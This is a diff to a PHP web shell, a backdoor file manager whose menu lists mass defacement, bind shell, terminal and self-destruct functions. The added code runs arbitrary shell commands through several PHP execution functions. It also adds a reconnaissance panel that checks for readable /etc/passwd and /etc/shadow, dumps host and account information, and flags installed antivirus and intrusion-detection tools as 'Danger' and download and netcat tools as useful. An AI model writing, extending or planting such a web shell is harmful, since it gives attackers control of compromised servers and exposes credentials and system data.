@@ -71,13 +71,160 @@ if(isset($_POST['password'])){
 }
 
 //Logout
-if(isset($_GET['action']) == "logout"){
-session_start();
-session_destroy();
-$serv = htmlentities($_SERVER['PHP_SELF']);
-header('location:'.$serv);
+if(isset($_GET['action']) & $_GET['action']=="logout"){
+	session_start();
+	session_destroy();
+	$serv = htmlentities($_SERVER['PHP_SELF']);
+	header('location:'.$serv);
 }
 
+//Cek HDD
+function viewSize($s) {
+	if($s >= 1073741824)
+		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
+	elseif($s >= 1048576)
+		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
+	elseif($s >= 1024)
+		return sprintf('%1.2f', $s / 1024 ) . ' KB';
+	else
+		return $s . ' B';
+}
+
+//Cek Warna Permission
+function viewPermsColor($f) { 
+	if (!@is_readable($f))
+		return '<font color=#FF0000><b>'.perms(@fileperms($f)).'</b></font>';
+	elseif (!@is_writable($f))
+		return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>';
+	else
+		return '<font color=#00BB00><b>'.perms(@fileperms($f)).'</b></font>';
+}
+
+//Cek Permission
+function perms($p) {
+	if (($p & 0xC000) == 0xC000)$i = 's';
+	elseif (($p & 0xA000) == 0xA000)$i = 'l';
+	elseif (($p & 0x8000) == 0x8000)$i = '-';
+	elseif (($p & 0x6000) == 0x6000)$i = 'b';
+	elseif (($p & 0x4000) == 0x4000)$i = 'd';
+	elseif (($p & 0x2000) == 0x2000)$i = 'c';
+	elseif (($p & 0x1000) == 0x1000)$i = 'p';
+	else $i = 'u';
+	$i .= (($p & 0x0100) ? 'r' : '-');
+	$i .= (($p & 0x0080) ? 'w' : '-');
+	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
+	$i .= (($p & 0x0020) ? 'r' : '-');
+	$i .= (($p & 0x0010) ? 'w' : '-');
+	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
+	$i .= (($p & 0x0004) ? 'r' : '-');
+	$i .= (($p & 0x0002) ? 'w' : '-');
+	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
+	return $i;
+}
+
+//Cek Drive
+	$drives = "";
+	if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+		foreach( range('a','z') as $drive )
+		if (is_dir($drive.':\\'))
+			$drives .= '<a href="?file='.$drive.':" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
+	}
+
+//Function Ex
+function ex($in) {
+	$out = '';
+	if(function_exists('exec')) {
+		@exec($in,$out);
+		$out = @join("\n",$out);
+	}elseif(function_exists('passthru')) {
+		ob_start();
+		@passthru($in);
+		$out = ob_get_clean();
+	}elseif(function_exists('system')) {
+		ob_start();
+		@system($in);
+		$out = ob_get_clean();
+	}elseif(function_exists('shell_exec')) {
+		$out = shell_exec($in);
+	}elseif(is_resource($f = @popen($in,"r"))) {
+		$out = "";
+		while(!@feof($f))
+			$out .= fread($f,1024);
+		pclose($f);
+	}
+	return $out;
+}
+	
+//Cek Security
+function actionSecInfo() {
+
+	echo '<h1>Server security information</h1><div class=content>';
+	function showSecParam($n, $v) {
+		$v = trim($v);
+		if($v) {
+			echo '<span>'.$n.': </span>';
+			if(strpos($v, "\n") === false)
+				echo $v.'<br>';
+			else
+				echo '<pre class=ml1>'.$v.'</pre>';
+		}
+	}
+	
+	showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
+	if(function_exists('apache_get_modules'))
+       	showSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
+	showSecParam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'none');
+	showSecParam('Open base dir', @ini_get('open_basedir'));
+	showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
+	showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
+	showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
+	$temp=array();
+	if(function_exists('mysql_get_client_info'))
+		$temp[] = "MySql (".mysql_get_client_info().")";
+	if(function_exists('mssql_connect'))
+		$temp[] = "MSSQL";
+	if(function_exists('pg_connect'))
+		$temp[] = "PostgreSQL";
+	if(function_exists('oci_connect'))
+		$temp[] = "Oracle";
+	showSecParam('Supported databases', implode(', ', $temp));
+	echo '<br>';
+	
+	if( $GLOBALS['os'] == 'nix' ) {
+		$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
+		$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
+		$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
+		showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
+		showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"etc\", \"shadow\")'>[view]</a>":'no');
+		showSecParam('OS version', @file_get_contents('/proc/version'));
+		showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
+		if(!$GLOBALS['safe_mode']) {
+			echo '<br>';
+			$temp=array();
+			foreach ($userful as $item)
+				if(which($item)){$temp[]=$item;}
+			showSecParam('Userful', implode(', ',$temp));
+			$temp=array();
+			foreach ($danger as $item)
+				if(which($item)){$temp[]=$item;}
+			showSecParam('Danger', implode(', ',$temp));
+			$temp=array();
+			foreach ($downloaders as $item) 
+				if(which($item)){$temp[]=$item;}
+			showSecParam('Downloaders', implode(', ',$temp));
+			echo '<br/>';
+			showSecParam('Hosts', @file_get_contents('/etc/hosts'));
+			showSecParam('HDD space', ex('df -h'));
+			showSecParam('Mount options', @file_get_contents('/etc/fstab'));
+		}
+	} else {
+		showSecParam('OS Version',ex('ver')); 
+		showSecParam('Account Settings',ex('net accounts')); 
+		showSecParam('User Accounts',ex('net user'));
+	}
+	echo '</div>';
+
+}
 // ================================
 // if user is logged in
 if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
@@ -173,22 +320,30 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 								else{
 									echo 'Safe mode:<font color="green"> OFF </font><br />';
 								} 
+								$cwd = @getcwd();
+								$GLOBALS['cwd'] = @getcwd();
+								$freeSpace = @disk_free_space($GLOBALS['cwd']);
+								$totalSpace = @disk_total_space($GLOBALS['cwd']);
+								$cwd_links = '';
+								$path = explode("/", $GLOBALS['cwd']);
+								$n=count($path);
+								for($i=0;$i<$n-1;$i++) {
+									$cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
+									for($j=0;$j<=$i;$j++)
+										$cwd_links .= $path[$j].'/';
+									$cwd_links .= "\")'>".$path[$i]."/</a>";
+								}
+								
 								?>
 								
-								<a href="?file=">C:\</a><a href="?file=">xampp\</a><a href="?file=">htdocs\</a><a href="?file=">shell\</a>&nbsp;&nbsp;&nbsp;<font color="green">drwxrwxrwx</font>
-								<br>Filesystem Mounted: 42.61 GB of 97.56 GB (43.68%)
+								<a href="?file=">C:\</a><a href="?file=">xampp\</a><a href="?file=">htdocs\</a><a href="?file=">shell\</a>&nbsp;&nbsp;&nbsp;<?php echo $cwd_links.viewPermsColor($GLOBALS['cwd']); ?>
+								<br>Filesystem Mounted: <?php echo "<span>Free</span> ".viewSize($freeSpace)." of ".viewSize($totalSpace)."  (".(int)($freeSpace/$totalSpace*100)."%)"; ?> 
 								<br>ifconfig : <?=gethostbyname($_SERVER["HTTP_HOST"])?> <a href="http://whois.domaintools.com/<?=gethostbyname($_SERVER["HTTP_HOST"])?>">(Whois)</a>
-								<br />Detected drives: 
-								<a href="?xtux=ls&amp;d=a%3A%5C" onclick="return confirm('Make sure this is correct.')">[ a ]</a> 
-								<a href="?xtux=ls&amp;d=c%3A%5C">[ c ]</a> 
-								<a href="?xtux=ls&amp;d=d%3A%5C">[ d ]</a> 
-								<a href="?xtux=ls&amp;d=e%3A%5C">[ e ]</a> 
-								<a href="?xtux=ls&amp;d=f%3A%5C">[ f ]</a> 
-								<br><a href="?"></a>
+								<br />Detected drives: <?=$drives?><br />
 								Disabled Functions : None (Bypass)<br />
 					</p>
 			</td>
-		</tr>
+		</tr>		
 		<?php
 			//Exec Form
 			if(isset($_GET['cmd'])){
@@ -214,6 +369,15 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 		<?php
 		}
 		?>
+		<?php
+		//Show Security Information
+		if(isset($_GET['action']) & $_GET['action']=="secinfo"){
+		echo "<tr><td>";
+		echo actionSecInfo();
+		echo "</td></tr>";
+		}
+		?>
+		
 		<tr>
 			<td style="font-size:14px;">
 			<a href="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>">File</a> | 
@@ -222,6 +386,7 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 			<a href="?action=">Mass Deface</a> | 
 			<a href="?action=">Hasher</a> | 
 			<a href="?action=">Bind</a> | 
+			<a href="?action=secinfo">Sec Info</a> |
 			<a href="?action=">Terminal</a> | 
 			<a href="?action=">Self-Destroy</a> | 
 			<a href="?action=logout">Logout</a>			
